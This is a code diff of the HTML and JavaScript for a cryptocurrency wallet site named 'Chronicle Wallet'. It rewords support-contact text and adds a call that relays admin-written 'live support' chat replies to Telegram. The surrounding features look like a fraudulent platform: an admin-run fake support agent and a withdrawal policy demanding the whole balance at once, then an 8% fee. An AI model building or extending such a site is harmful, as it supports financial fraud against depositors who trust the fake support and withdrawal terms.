@@ -170,7 +170,7 @@
             <span style="cursor:pointer; font-size:1.25rem; color:var(--text-muted);" onclick="toggleSupportChat()">&times;</span>
         </div>
         <div class="chat-body" id="chat-messages-container">
-            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Reach us anytime at support@chroniclewallets.com.<span class="msg-meta">12:00 PM • ✓✓</span></div>
+            <div class="chat-bubble agent">Hello! Welcome to Chronicle Wallet 24/7 live support. How can we help you today? Contact us anytime at support@chroniclewallets.com.<span class="msg-meta">12:00 PM • ✓✓</span></div>
         </div>
         <div style="padding: 0 1rem 0.5rem 1rem; font-size:0.75rem; color:var(--text-muted); font-style:italic;" id="typing-indicator-box" class="hidden">
             Agent is typing...
@@ -293,7 +293,7 @@
                     For nearly a decade, Chronicle Wallet has stood as a pioneer and unwavering pillar of security, speed, and reliability in the decentralized digital asset ecosystem. Founded in 2015 at the intersection of traditional finance and cryptographic innovation, our platform was built with a singular core vision: to empower everyday users, active traders, and institutional investors across the globe with institutional-grade financial sovereignty.
                 </p>
                 <p style="color: var(--text-muted); font-size: 0.9rem; margin-bottom: 1rem;">
-                    We pride ourselves on offering seamless transactions, top-tier asset security, and a <strong>24/7 dedicated live support team</strong> ready to assist you anytime. Whether you are trading cryptocurrencies or managing your fiat portfolio, you can always reach our official support desk directly at <strong style="color: var(--primary);">support@chroniclewallets.com</strong> or via our instant live chat widget.
+                    We pride ourselves on offering seamless transactions, top-tier asset security, and a <strong>24/7 dedicated live support team</strong> ready to assist you anytime. Whether you are trading cryptocurrencies, managing your portfolio, or handling withdrawals, you can always reach our official support desk directly at <strong style="color: var(--primary);">support@chroniclewallets.com</strong> or via our instant live chat widget.
                 </p>
                 <div style="text-align:center; margin-top:1.5rem;">
                     <button class="btn btn-success" style="display:inline-block; width:auto; padding:0.75rem 2rem;" onclick="openAuthModal('signup')">Get Started / Create Account</button>
@@ -523,7 +523,7 @@
             <span class="close-btn" onclick="closeWithdrawFormModal()">&times;</span>
             <h3 style="margin-bottom:1rem;" id="withdraw-method-title">Withdraw</h3>
             <div style="background: rgba(99, 102, 241, 0.1); border: 1px solid var(--primary); padding: 0.75rem; border-radius: 8px; margin-bottom: 1rem; font-size: 0.85rem; color: var(--text-muted);">
-                💡 <strong>Withdrawal Policy:</strong> First withdrawal must be for your entire available balance at once (Free with zero charges). Subsequent withdrawals carry an 8% withdrawal fee. Withdrawals are processed exclusively using your <strong>USD Fiat balance</strong>.
+                💡 <strong>Withdrawal Policy:</strong> First withdrawal must be for your entire available balance at once (Free with zero charges). Subsequent withdrawals carry an 8% withdrawal fee. Withdrawals are processed exclusively using your <strong>USD Fiat balance</strong>. For help, contact support@chroniclewallets.com.
             </div>
             <form onsubmit="requestWithdrawalPinCheck(event)">
                 <div class="form-group">
@@ -1584,6 +1584,8 @@
                     adminTyping: false
                 }, { merge: true });
             });
+
+            sendTelegramAlert(`💬 <b>ADMIN SUPPORT REPLY</b>\n\n👤 <b>To User:</b> ${emailKey}\n🤖 <b>Agent:</b> ${agentName}\n✉️ <b>Message:</b> ${replyText}`);
         }
 
         function saveAdminTerms(e) {
